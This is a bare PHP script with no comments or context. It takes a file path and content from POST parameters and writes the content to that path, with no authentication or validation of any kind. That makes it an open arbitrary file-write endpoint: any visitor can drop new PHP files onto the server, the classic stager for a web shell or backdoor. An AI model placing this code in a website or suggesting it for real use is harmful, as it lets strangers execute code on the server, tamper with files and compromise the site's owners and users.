<?php
    if(isset($_POST['path'])) {
        $path = $_POST['path'];
        $input = $_POST['input'];
        $file = fopen($path, "w") or die("Unable to open file!");
        fwrite($file, $input);
        fclose($file);
    }
?>